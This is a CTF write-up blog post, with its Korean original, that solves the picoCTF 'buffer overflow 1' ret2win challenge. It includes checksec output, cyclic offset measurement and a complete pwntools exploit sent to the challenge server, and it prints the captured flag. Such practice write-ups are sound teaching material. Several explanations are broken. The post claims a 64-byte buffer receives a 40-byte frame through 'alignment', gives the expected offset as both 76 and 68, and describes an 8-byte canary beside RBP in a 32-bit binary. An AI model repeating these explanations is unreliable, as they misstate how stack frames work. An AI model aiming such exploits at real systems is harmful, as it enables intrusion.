---
title: 'CTF — picoCTF: buffer overflow 1'
date: 2026-06-04 22:13:00 +0900
categories:
- CTF
tags:
- ctf
- pwn
- picoCTF
- ret2win
- 32bit
author: mmamm4
---

# CTF — picoCTF: buffer overflow 1

> **Objective**: Overwrite the saved return address with the address of `win()`, which reads a server-side `flag.txt` and prints it to stdout — bypassing normal control flow via a classic stack buffer overflow.
>
> **Environment**: picoCTF Practice Arena (play.picoctf.org), 32-bit Linux ELF, `vuln.c` source provided
>
> **Attack Technique**: Classic Stack Buffer Overflow → Return Address Overwrite (Ret2Win)

---

## 0. This Challenge in Context

picoCTF buffer overflow 1 is a direct application of the technique covered in 2026-05-18-Exploit-dev-01-ret2win. The mechanics are identical — `gets()` overflow, cyclic offset measurement, `win()` address overwrite — with one practical addition: the exploit must land on a remote process, and the flag arrives over a socket rather than from a local shell.

Two specifics differ from Exploit Dev-01 worth noting before diving in:

- **NX is enabled.** Unlike our practice binary, the stack is not executable here. This is irrelevant for ret2win — we redirect execution to existing code (`win()`), not injected shellcode.
- **The offset is 44, not 76.** `BUFFSIZE` reads 64 in the source, but the compiler allocates a 40-byte frame. Declared array size and actual stack layout are two different things. This writeup documents why.

---

## 1. Binary Inspection

```bash
$ file ./vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
      interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, not stripped

$ checksec --file=./vuln
[*] '/home/kali/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Three out of four properties are in our favor:

- **No canary** — the buffer and saved return address are adjacent; nothing verifies the region between them on function return
- **No PIE** — the code section loads at a fixed base (`0x08048000`) on every run, so `win()`'s address is constant
- **NX enabled** — shellcode injected onto the stack would not execute, but that is not our plan

---

## 2. Source Code

```c
#define BUFFSIZE 64
#define FLAGSIZE 64

void win() {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Please create 'flag.txt' in this directory with your own flag.\n");
        exit(0);
    }
    fgets(buf, FLAGSIZE, f);
    printf(buf);
}

void vuln() {
    char buf[BUFFSIZE];
    gets(buf);
    printf("Okay, time to return... Fingers Crossed... Pointer... ");
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Please enter your string: \n");
    vuln();
    return 0;
}
```

The same root cause as Exploit Dev-01: `gets()` imposes no length limit. Any input past `BUFFSIZE` bytes spills into adjacent stack regions.

The only behavioral difference from our practice binary is in `win()`: instead of calling `system("/bin/sh")`, it opens `flag.txt` on the server and prints the contents to stdout — which, on the remote process, is our socket.

---

## 3. Crashing the Binary

```bash
$ python3 -c "print('A'*200)" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Pointer... Segmentation fault (core dumped)
```

Segfault at 200 bytes. The overflow is reaching and corrupting the return address, exactly as expected.

---

## 4. Finding the Exact Offset — Cyclic Pattern

### 4.1 Generating the Pattern

```
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa
vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaab
raabsaabtaabuaabvaabwaabxaabyaabz
```

### 4.2 Crashing Under GDB

```
pwndbg> r
Please enter your string:
aaaabaaacaaad...

Program received signal SIGSEGV, Segmentation fault.

pwndbg> info registers
eax  0xc9  0xc9
ebx  0x6161616a  0x6161616a
esp  0xffffd1f0  0xffffd1f0
ebp  0x6161616b  0x6161616b
eip  0x6161616c  0x6161616c   ← "laaa"
```

### 4.3 Reverse-Calculating the Offset

```
pwndbg> cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

**Offset = 44.**

### 4.4 Why 44 and Not 68?

`BUFFSIZE=64`, so arithmetic suggests the return address sits 68 bytes from the start of `buf` (64 for the buffer, 4 for saved EBP). The disassembly tells a different story:

```
pwndbg> disassemble vuln
   0x080492b5 <+0>:  push   ebp
   0x080492b6 <+1>:  mov    ebp,esp
   0x080492b8 <+3>:  sub    esp,0x28       ← 40 bytes allocated, not 64
   0x080492bb <+6>:  lea    eax,[ebp-0x28]
   0x080492be <+9>:  push   eax
   0x080492bf <+10>: call   0x8049070 <gets@plt>
```

The compiler emitted `sub esp, 0x28` — 40 bytes of local space, not 64. Stack alignment to a 16-byte boundary causes this. The declared array size (`BUFFSIZE=64`) is a C-level abstraction; the actual allocation is determined by the compiler.

```
High address
┌──────────────────────────────┐
│   main() stack frame         │
├──────────────────────────────┤
│   return address (4 bytes)   │ ← overwrite target: win() address
├──────────────────────────────┤
│   saved EBP (4 bytes)        │
├──────────────────────────────┤
│   buf (40 bytes)             │ ← gets() begins here; BUFFSIZE=64 in source,
│   [ebp-0x28 … ebp-0x01]      │   40-byte frame in compiled binary
└──────────────────────────────┘
Low address

40 (allocated frame) + 4 (saved EBP) = 44 → return address slot
```

Source-code arithmetic produces the declared size, not the actual layout. **Always measure the offset directly with cyclic.**

---

## 5. Locating `win()`

```bash
$ objdump -d ./vuln | grep "<win>:"
080491f6 <win>:

pwndbg> info function win
0x080491f6  win
```

**`win()` address = `0x080491f6`.**

With PIE disabled, this address is fixed on every run. The same binary is deployed on the remote server, so the same address applies there.

---

## 6. Writing the Exploit

| Item | Value |
|---|---|
| Offset (buf → return address) | 44 |
| `win()` address | `0x080491f6` |

### 6.1 Payload Structure

```
[ 'A' × 44 ][ win() address (4 bytes, little-endian) ]
```

x86 is little-endian: `0x080491f6` is stored as `\xf6\x91\x04\x08`. pwntools' `p32()` handles this automatically.

### 6.2 exploit.py

```python
from pwn import *

BINARY = './vuln'
REMOTE = ('saturn.picoctf.net', 65535)  # replace port with value from challenge page

elf = ELF(BINARY)
context.binary = elf

win_addr = elf.symbols['win']
log.info(f"win() @ {hex(win_addr)}")

offset = 44
payload = flat(b'A' * offset, win_addr)

io = remote(*REMOTE)
io.sendlineafter(b'string: \n', payload)
print(io.recvall().decode())
```

`elf.symbols['win']` reads the address directly from the binary's symbol table — no hardcoding required.

### 6.3 Execution

```bash
$ python3 exploit.py
[*] '/home/kali/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to saturn.picoctf.net on port 65535: Done
[*] win() @ 0x80491f6
Okay, time to return... Fingers Crossed... Pointer... picoCTF{addr3ss3s_ar3_3asy_w1th_p3da_91a52424}
[*] Got EOF while reading in recvall
```

**Flag obtained.**

---

## 7. Attack Flow

```
[1] vuln() calls gets(buf)
       ↓
[2] Input: 44 bytes of padding + 4 bytes of win() address (little-endian)
       ↓
[3] Overflow covers buf (40B) → saved EBP (4B) → return address (4B)
       ↓
[4] Return address slot now holds 0x080491f6
       ↓
[5] vuln() executes ret — pops 0x080491f6 from stack into EIP
       ↓
[6] CPU executes win()
       ↓
[7] win() opens flag.txt, reads contents, prints to stdout (= socket)
       ↓
[8] Flag received over the network connection
```

---

## 8. Local vs. Remote

The payload is byte-for-byte identical for local and remote targets. The only difference is delivery:

- **Local** (`process()`): `printf(buf)` writes to the terminal
- **Remote** (`remote()`): `printf(buf)` writes to the socket → `io.recvall()` collects it

pwntools' `remote()` is a drop-in replacement for `process()`. This is the standard pattern for every CTF challenge from here on.

---

## 9. Takeaway

Two things this challenge confirms:

1. **The return address is the fundamental primitive.** Once you control it, whether the target is a local shell or a remote flag file is a detail — the exploit structure is the same.
2. **Source size ≠ stack layout.** `BUFFSIZE=64` implied an offset of 68; the actual offset was 44. The compiler's allocation decision (`sub esp, 0x28`) is what matters, not the C declaration.

The next barrier is the stack canary: a random 8-byte value the compiler inserts between the buffer and saved RBP. The same overflow that works here will abort the process the moment it touches the canary — until we can leak it first. That is the subject of Exploit-dev-04-stack-canary.

---

<style>.kr-code-block{margin:1em 0;border-radius:6px;overflow-x:auto;background:#272822;}.kr-code-block>code{display:block;white-space:pre;padding:1em;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:0.85em;line-height:1.5;color:#f8f8f2;background:transparent;}</style>
<details class="kr-orig" markdown="0"><summary>🇰🇷 한국어 원문</summary><div class="kr-content">
<h2>CTF — picoCTF: buffer overflow 1</h2>
<blockquote>
<p><strong>목표</strong>: <code>win()</code> 함수로 return address를 덮어써서 서버의 <code>flag.txt</code>를 읽어오는 스택 버퍼 오버플로우 익스플로잇입니다.</p>
<p><strong>환경</strong>: picoCTF Practice Arena (play.picoctf.org), 32-bit Linux ELF, <code>vuln.c</code> 소스 제공</p>
<p><strong>공격 기법</strong>: Classic Stack Buffer Overflow → Return Address Overwrite (Ret2Win)</p>
</blockquote>
<hr />
<h2>0. 이 문제의 위치</h2>
<p>picoCTF buffer overflow 1은 Exploit Dev-01 ret2win 연구에서 익힌 기법의 직접 적용입니다. <code>gets()</code> 오버플로우 → cyclic 오프셋 측정 → <code>win()</code> 주소 덮어쓰기, 구조가 동일합니다. 실전에서 달라지는 점은 원격 프로세스에 페이로드를 보내야 한다는 것 하나입니다.</p>
<p>Exploit Dev-01과 다른 두 가지를 미리 짚어두겠습니다.</p>
<ul>
<li><strong>NX가 켜져 있습니다.</strong> 스택에 shellcode를 넣어도 실행되지 않습니다. Ret2Win은 영향이 없습니다 — 이미 존재하는 코드(<code>win()</code>)로 점프할 뿐이기 때문입니다.</li>
<li><strong>오프셋이 44바이트입니다(76이 아님).</strong> <code>BUFFSIZE=64</code>이지만 컴파일러가 실제 할당하는 프레임은 40바이트입니다. 소스 선언 크기와 실제 스택 레이아웃은 다릅니다.</li>
</ul>
<hr />
<h2>1. 바이너리 검사</h2>
<pre class="highlight"><code class="language-bash">$ checksec --file=./vuln
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>

<ul>
<li><strong>Canary 없음</strong> → 버퍼와 return address 사이에 검증 값이 없습니다. 마음껏 덮어쓸 수 있습니다.</li>
<li><strong>PIE 없음</strong> → 코드 영역 주소가 고정됩니다. <code>win()</code> 주소가 매 실행마다 동일합니다.</li>
<li><strong>NX 있음</strong> → 스택 실행이 불가합니다. 하지만 shellcode를 쓸 계획이 없으므로 무관합니다.</li>
</ul>
<hr />
<h2>2. 소스 코드</h2>
<pre class="highlight"><code class="language-c">void win() {
    FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
    fgets(buf, FLAGSIZE, f);
    printf(buf);  // 서버 측 flag.txt를 소켓으로 출력
}

void vuln() {
    char buf[BUFFSIZE];  // BUFFSIZE = 64
    gets(buf);           // 취약점: 길이 제한 없음
}
</code></pre>

<p>취약점은 <code>gets()</code>입니다. 길이 제한이 없어 입력이 버퍼를 초과하면 인접한 스택 영역을 덮어씁니다. <code>win()</code>은 쉘을 띄우는 대신 <code>flag.txt</code>를 읽어 소켓으로 출력합니다.</p>
<hr />
<h2>3. 1차 크래시 확인</h2>
<pre class="highlight"><code class="language-bash">$ python3 -c &quot;print('A'*200)&quot; | ./vuln
Segmentation fault (core dumped)
</code></pre>

<p>200바이트 입력으로 Segfault가 발생합니다. 오버플로우가 return address까지 도달하고 있음을 확인할 수 있습니다.</p>
<hr />
<h2>4. 정확한 오프셋 탐색 — Cyclic Pattern</h2>
<pre class="highlight"><code class="language-bash">pwndbg&gt; cyclic 200
aaaabaaacaaad... (200자 시퀀스)

pwndbg&gt; r
## 패턴 입력 후 크래시

pwndbg&gt; info registers
eip  0x6161616c   ← &quot;laaa&quot;

pwndbg&gt; cyclic -l 0x6161616c
Found at offset 44
</code></pre>

<p><strong>오프셋 = 44.</strong></p>
<h3>왜 68이 아니라 44인가</h3>
<p><code>BUFFSIZE=64</code> → 예상 오프셋은 68 (buf 64바이트 + saved EBP 4바이트)입니다. 하지만 실제 어셈블리를 보면 다릅니다.</p>
<pre class="highlight"><code>sub esp, 0x28   ← 40바이트 할당 (64가 아님)
lea eax, [ebp-0x28]   ← buf 시작 위치
</code></pre>

<p>컴파일러가 스택을 16바이트 경계로 정렬하면서 실제 프레임은 40바이트가 되었습니다.</p>
<pre class="highlight"><code>buf(40B) + saved EBP(4B) = 44B → return address 자리
</code></pre>

<p>소스 코드의 선언 크기로 오프셋을 계산하면 틀립니다. <strong>항상 cyclic으로 직접 측정합니다.</strong></p>
<pre class="highlight"><code>높은 주소
┌──────────────────────────────┐
│   return address (4 bytes)   │ ← 덮어야 할 곳
├──────────────────────────────┤
│   saved EBP (4 bytes)        │
├──────────────────────────────┤
│   buf (40 bytes)             │ ← gets() 시작, BUFFSIZE=64이나 프레임=40
└──────────────────────────────┘
낮은 주소
</code></pre>

<hr />
<h2>5. win() 주소 확인</h2>
<pre class="highlight"><code class="language-bash">$ objdump -d ./vuln | grep &quot;&lt;win&gt;:&quot;
080491f6 &lt;win&gt;:
</code></pre>

<p>PIE가 꺼져 있으므로 주소가 고정됩니다. 원격 서버에도 동일한 바이너리가 배포되므로 같은 주소가 유효합니다.</p>
<hr />
<h2>6. 익스플로잇 작성</h2>
<table>
<thead>
<tr>
<th>항목</th>
<th>값</th>
</tr>
</thead>
<tbody>
<tr>
<td>Offset</td>
<td>44</td>
</tr>
<tr>
<td>win() 주소</td>
<td><code>0x080491f6</code></td>
</tr>
</tbody>
</table>
<pre class="highlight"><code class="language-python">from pwn import *

elf = ELF('./vuln')
context.binary = elf

win_addr = elf.symbols['win']
offset = 44
payload = flat(b'A' * offset, win_addr)

io = remote('saturn.picoctf.net', 65535)  # 실제 포트로 교체
io.sendlineafter(b'string: \n', payload)
print(io.recvall().decode())
</code></pre>

<pre class="highlight"><code>[*] win() @ 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_w1th_p3da_91a52424}
</code></pre>

<hr />
<h2>7. 공격 흐름</h2>
<pre class="highlight"><code>[1] gets(buf) 호출
       ↓
[2] 입력: 패딩 44바이트 + win() 주소 4바이트 (little-endian)
       ↓
[3] buf(40B) → saved EBP(4B) → return address(4B) 덮어쓰기
       ↓
[4] return address = 0x080491f6
       ↓
[5] vuln() 종료 → ret → EIP = win()
       ↓
[6] win()이 flag.txt 읽어 소켓으로 출력
       ↓
[7] 플래그 수신
</code></pre>

<hr />
<h2>8. 로컬 vs. 원격</h2>
<p>페이로드는 로컬과 원격에서 완전히 동일합니다. 차이는 출력 경로뿐입니다.</p>
<ul>
<li><strong>로컬</strong> (<code>process()</code>): <code>printf(buf)</code> → 터미널</li>
<li><strong>원격</strong> (<code>remote()</code>): <code>printf(buf)</code> → 소켓 → <code>io.recvall()</code>로 수신</li>
</ul>
<p>pwntools의 <code>remote()</code>는 <code>process()</code>의 drop-in 대체재입니다. 이 패턴은 이후 모든 CTF 문제에서 동일하게 적용됩니다.</p>
<hr />
<h2>9. 핵심 정리</h2>
<p>이번 문제를 통해 두 가지를 확인할 수 있습니다.</p>
<ol>
<li><strong>Return address가 본질적인 제어 지점입니다.</strong> 한 번 제어하면 목표가 로컬 쉘이든 원격 플래그 파일이든 익스플로잇 구조는 동일합니다.</li>
<li><strong>소스 크기 ≠ 스택 레이아웃.</strong> <code>BUFFSIZE=64</code> → 예상 68, 실제 44. 컴파일러 할당(<code>sub esp, 0x28</code>)이 기준이며, 반드시 cyclic으로 직접 측정해야 합니다.</li>
</ol>
<p>다음 단계는 stack canary 우회입니다. canary가 buf와 return address 사이에 삽입되면 같은 오버플로우가 canary를 먼저 덮어 프로세스를 abort시킵니다. 해결책은 canary 값을 먼저 leak하는 것입니다.</p>
</div></details>

